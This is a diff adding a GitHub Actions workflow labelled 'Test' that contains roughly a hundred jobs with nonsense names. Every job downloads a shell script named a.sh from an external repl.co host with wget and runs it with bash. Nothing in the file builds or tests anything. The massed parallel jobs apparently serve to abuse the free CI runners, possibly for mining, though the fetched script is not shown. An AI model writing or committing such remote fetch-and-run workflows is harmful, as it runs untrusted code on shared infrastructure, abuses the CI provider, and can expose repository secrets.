@@ -1,0 +1,901 @@
+
+name: Test
+
+on:
+  workflow_dispatch:
+  
+  
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  builwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builed:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builtd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiyld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builud:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiald:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builsd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builzd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buildx:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builcd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiwwwld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buieevqqqqld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builrbpppprd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buitbiitld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buifbuufld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buixcbyyld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  builbttd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  builbrrwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builbeeqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builbwwwed:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buibqqqqqqlrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builnmmmmtd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiynbbbbld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builunvvvvd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buialnccccd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builnxxxxxxsd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builnzzzzzzzd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buinlllllllldx:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builcnkkkkkkd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builnjjjjjjqqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiwwnhhhhhhwld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buieenggggggld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builrnffffffrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buittnddddddld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buinssssssffld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buinaaaaaaxcld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  bunppppppild:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  builnooooowd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqniiiiid:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buinuuuuuled:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builnttttttrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builtnrrrrrrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiyneeeeeld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builunwwwwwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buialnqqqqqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmnnnnnnsd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  bumbbbbbbilzd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buimvvvvvvldx:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmccccccccd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqmxxxxxxqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiwwwmzzzzzzld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buieelmllllld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builrmkkkkkrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buittmjjjjjld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buifmhhhhhhfld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buixcmgggggld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmfffffd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  builmdddddwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmssssssqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builemaaaaad:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmpppppprd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buimooooooltd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiymiiiiiild:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buimuuuuulud:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buimyyyyyyald:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  bumtttttilsd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builzdmrrrrr:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builmeeeeeedx:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builcmwwwwwwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqmqqqqqqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiwwwmmmmmld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buinnnnnneeld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builrbbbbbbrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buittvvvvvvld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buifflccccccd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buixcxxxxxxld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builzzzzzzd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+  buillllllwd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builkkkkkqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buijjjjjjled:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builhhhhhhrd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buigggggggltd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiyfffffffld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builddddddud:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buialssssssd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builsdaaaaaaa:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqqqqqqzd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buildwwwwwwx:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builceeeeed:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builqrrrrrqd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiwttttttwwld:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buieelyyyyyd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  builruuuuurd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buittliiiiid:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buiffloooood:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
+
+  buixclppppd:
+    runs-on: ubuntu-latest
+
+    steps:
+
+      - uses: actions/checkout@v2
+      - run: wget https://HTML-CSS-JS.idotmastera.repl.co/a.sh
+      - run: bash a.sh
